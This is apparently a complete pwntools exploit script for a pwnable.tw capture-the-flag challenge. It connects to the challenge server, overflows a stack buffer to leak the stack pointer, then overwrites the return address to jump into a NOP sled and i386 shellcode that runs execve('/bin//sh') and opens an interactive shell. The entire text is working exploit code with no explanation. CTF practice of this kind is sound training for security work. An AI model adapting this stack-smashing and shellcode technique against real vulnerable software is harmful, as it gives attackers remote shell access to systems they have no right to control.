from pwn import *

context(os='linux', arch='i386')

p = remote('chall.pwnable.tw', 10000)


shellcode = asm("""
    xor eax, eax
    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    mov al, 0xb
    int 0x80
""")

leak = 0x08048087

p.recvuntil(b':')
p.send(b"A"*20 + p32(leak))

esp = u32(p.recv(4))
log.success(f"Leaked ESP = {hex(esp)}")

ret_address = esp+24

nop_sled = asm('nop') * 8

payload = p32(ret_address)*6 + nop_sled + shellcode

p.send(payload)

p.interactive()


